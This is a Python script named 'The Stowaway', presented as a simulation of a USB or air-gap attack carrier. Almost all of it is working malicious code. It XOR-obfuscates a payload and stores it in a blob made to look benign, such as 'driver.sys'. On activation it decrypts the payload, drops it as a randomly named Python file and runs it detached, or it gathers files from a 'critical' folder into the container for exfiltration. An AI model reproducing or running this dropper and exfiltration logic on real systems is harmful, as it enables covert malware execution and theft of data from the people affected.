#!/usr/bin/env python3
"""
The Stowaway: Advanced Encrypted Carrier.
Simulates an air-gapped threat vector (USB/Media).
Carries data out (Exfil) or payloads in (Injector).
Self-contained, encrypted body.
"""

import os
import sys
import time
import random
import base64
import json
import subprocess

# Simple XOR encryption for simulation (Obfuscation)
def xor_crypt(data, key):
    return bytearray([b ^ key[i % len(key)] for i, b in enumerate(data)])

class Stowaway:
    def __init__(self, mode="INJECTOR", target_dir="/tmp", payload_path=None):
        self.mode = mode
        self.target_dir = target_dir
        self.key = os.urandom(16)
        self.body = b""

        # Load payload if Injector
        if self.mode == "INJECTOR" and payload_path:
            try:
                with open(payload_path, 'rb') as f:
                    self.body = xor_crypt(f.read(), self.key)
            except: pass

    def deploy(self, drop_path):
        """Serialize self to disk as an obfuscated blob."""
        container = {
            "mode": self.mode,
            "key": base64.b64encode(self.key).decode('utf-8'),
            "body": base64.b64encode(self.body).decode('utf-8')
        }
        # Save as a benign looking file (e.g., driver.sys or image.dat)
        with open(drop_path, 'w') as f:
            json.dump(container, f)

    @staticmethod
    def activate(drop_path, target_dir):
        """The 'Explosion'. Reads self, decrypts body, executes."""
        try:
            with open(drop_path, 'r') as f:
                container = json.load(f)

            mode = container["mode"]
            key = base64.b64decode(container["key"])
            body_enc = base64.b64decode(container["body"])

            if mode == "INJECTOR":
                # Decrypt payload
                payload_code = xor_crypt(body_enc, key)

                # Drop and Execute Payload (e.g., malware.py)
                malware_path = os.path.join(target_dir, f"service_{random.randint(1000,9999)}.py")
                with open(malware_path, 'wb') as f:
                    f.write(payload_code)

                # Execute detached
                subprocess.Popen([sys.executable, malware_path, "--port", "8888", "--target", target_dir])
                print(f"[STOWAWAY] Injected payload to {malware_path}")

            elif mode == "CARRIER":
                # Scan for critical files, encrypt into body, update self
                critical_dir = os.path.join(target_dir, "critical")
                if os.path.exists(critical_dir):
                    loot = b""
                    for f in os.listdir(critical_dir):
                        try:
                            with open(os.path.join(critical_dir, f), 'rb') as tf:
                                loot += tf.read()
                        except: pass

                    # Re-encrypt self with loot
                    new_body = xor_crypt(loot, key)
                    container["body"] = base64.b64encode(new_body).decode('utf-8')
                    container["status"] = "EXFIL_READY"

                    with open(drop_path, 'w') as f:
                        json.dump(container, f)
                    print(f"[STOWAWAY] Exfiltrated {len(loot)} bytes to container.")

        except Exception as e:
            print(f"[STOWAWAY] Activation Failed: {e}")

if __name__ == "__main__":
    # Self-activation logic for simulation
    if len(sys.argv) > 2:
        Stowaway.activate(sys.argv[1], sys.argv[2])
